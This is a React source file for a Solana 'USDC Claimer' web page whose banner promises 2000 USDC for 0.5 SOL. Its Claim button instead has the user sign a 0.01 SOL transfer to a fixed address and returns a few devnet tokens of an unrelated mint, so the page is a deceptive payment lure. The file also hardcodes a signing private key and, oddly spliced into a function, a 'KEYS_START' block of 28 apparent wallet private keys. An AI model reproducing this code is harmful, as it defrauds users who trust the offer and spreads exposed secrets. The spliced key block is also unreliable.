/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "yhyq8VohB4ipGJwdHt4q68PZyZRGXr2DPb61GPqi7hMcXdQvmqjV2FPVKhkx68KvfsxawocwzvKCswiwFByA8c4"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4inR5pLY7JUAo7niHeBBaPKtozgwQ9ubwpUgyu6SPGJzJtBSD6bAfqTCBS4TddvodtLgVq4tR5iKzYfARLW41sRt",
  "key1": "2Sj4ow9z8VXzXvRjoJrwxwCJyCcVYFhzx3LAbjL9V3NZn75fwmsvzfWHicnmtn7yxfiMmZHAhoC5HgjsUZivHzcB",
  "key2": "5U4e8gwAdD6DYxJqWjgAevNRbia6ZohkXzerTxPwyDTFY3o5g5pVaNLnTh9i3mu7PvdH6yEYQG885akPCrkeJ3yG",
  "key3": "4gcQAjqDsnw12ei6sAftS9xx3YAHzMhcmyjWtwLzErUJkbY2FXNQn7pZB9YKY9n3qZW8MrfmC6VFDV7iFphj9caB",
  "key4": "2gEK9f2fjXGj9THW5Wesf7zeKpFTRBE2sibyZ4nRFwzitgGy4AVJKRorc5RbZAgzSbvtna9sdVAfJUHL8xxWgRv",
  "key5": "3haCW6AhS9rna98HAH1uAbfbMxfnfn5AWvtJ1MrV1qUJFtvWgjSVms4bz4C7m5ocRhrpRd1YJR8gZ5ENddPu6nNA",
  "key6": "q5yJ6j1R94pDq49kQUqespGi23FjWp6q3gYhByuDzy26KaTqH3yo1J8RxAMSH9mEY7apMzGeZBQYMLMW5ZVtgsT",
  "key7": "jDVyNXB7cHgpkHA3EWS6VaCAkNua2zWmcJgRf2NWQP2xbFMoEcXQNKQrZDRq5aTRM9a9SfgCy6vQX1qQKrfMjp3",
  "key8": "3idBEhnFPTVzkDFwgSzbYadLgxiVhaMXMTqhbYYiDveeWAHfwN6qCfMVSe96FDz7ocZvdeF3THBTFZL5cRKPbSCo",
  "key9": "4LxKQGaBu3eE3WmRS8h9VTpFQgFMm4HDNaDw4UwKiqxxQQKcuciGrE5cTX6gwUJ8eoBsedztxDbMXUt2p4gGg5Bm",
  "key10": "4cyZYBEEmmLbbuurKHqAp1yHtUEGjL4Sg5BRFdMLPBFuP8fMe2yGstK3G7NAUUiCD3r15pf1f13EuZv48CDynVKj",
  "key11": "dJHeAGsKQZLxEt6NTScbA7yHKMerf3jYFa1557tW82GsYAgkUct2mXi5vkqMkHhxYaizEFzKt3CkEpY4m142ifb",
  "key12": "5h3jRwFLc2L2rVQrq9ZSPC5QqnEuUbwUBL9GY7wYFpZ4XKx754BPpgMfyZnXwU81ofZf49ywtPXas3CUTxzKvNbB",
  "key13": "5DG7ygt1pgtLAuVpbbs2muMK5uZgZSgxT7wd9rBFE5XbZd6uHvaLsKqD8tezEu8WDNqe3bYWMbTWZi71RQS8Ydsa",
  "key14": "2XW5sJx3fp6KgBGPvnPRdviM9Dfvftvu3vxT8HaKB5mnp8XJjL5ZfXM9CUABb7RfbA1KDQh2n4W8ZwRXT32wCPYP",
  "key15": "itBtiLreWhTQZ8851apuMHZnq917rp6oebgbmjmZo7ppyem2ai6heutQVUzGCZAGQwZLZ9cjUmgUR3WUPLjk8kt",
  "key16": "5r95YmPJYT9HKELuwSiZ5LGmwmLrbocKvamC7mqmjJ6AisqGpvtgvxfx6qrSVjR9DGi1RvWQ1U92e47SeBv7ZU5v",
  "key17": "5LAKumqoGBvTpbHcHozFrnq4GsCdKGNDHMh4wYZzd2fajLrMmednPb5nbpEUei237dMSGUT3q3KXUVBZHmumFbTN",
  "key18": "2dwEi5k3cJPg22idkjmzrwLcActiwqqUeua9Sbe397N3osGfDb5Lasoi8G28LaWVUMMwE8wVNahpJsYwB6QJRHqz",
  "key19": "3KDNoWsHotxxzLQDUXg2KyQrDPcdMsjnBiorFMbXZQcBAG42Zvik7CjTjeAroyWVy6dYPxACjJrqkRnWuSBfGduS",
  "key20": "5wKdLYBZ9G2xSM3nVhKdv1qFkCwe2iFjGZBjtWZtvxUZiikdF4nZu7hsA166dxPhX2eLrarEfbJRzSfSrf9b4H54",
  "key21": "KiJvjGosEMKtb69d8HtEBmFwneUQXgDKogd8ArQbZL4coqHfbm5qV1FiywpNqg3WeXskTbDvJ6rPr88EqQgkSxi",
  "key22": "2dWYXydtos4tvuegmHYPiwsio9VSggKCg4D6cUjpGRdE5QmNTxsX2pEgaM1SVnnzS4yyNPfDW4NMAYZ3eAfjV6Mt",
  "key23": "39SYB4aE5L7taTeR1mcmmEcHbQ7j7ZXE3wZtGCvXfgZ57ewDnVxFnzit54jjtRPEuusxxChnbxts3SZ4TMpdV7X5",
  "key24": "CMaaB82vQYUipomgVMckKEqsV5ggGgYksquHGgTzyxUEb58YKsvcUG2eB2qptMxMMjXcUFNzucDeBadYVvX6oPh",
  "key25": "34phPw2YbTpE3ybKU4mzZ1LEE6eLmeAc3mTP5crQLjMjgSQjvp8aWxhS96nhySTKf5zhFLUonnJQbjGpskir28Ao",
  "key26": "2j8Dw4K2oGBtnnfqwYnAHpDqCshj6htcTVwwd1cSkaRp6mcp5mNWSuv6qh9Hqn3P26u3YSZgLUWxJVu1MvNsHUrt",
  "key27": "pPoRMnb3ZZ54P97pdAwh1oKf5FyBkeNm6VZZMWnMpBVRPXCkoQsgbRsqX8Fv6DjnhJEm8EkSdYULcgFV4qA1o61"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
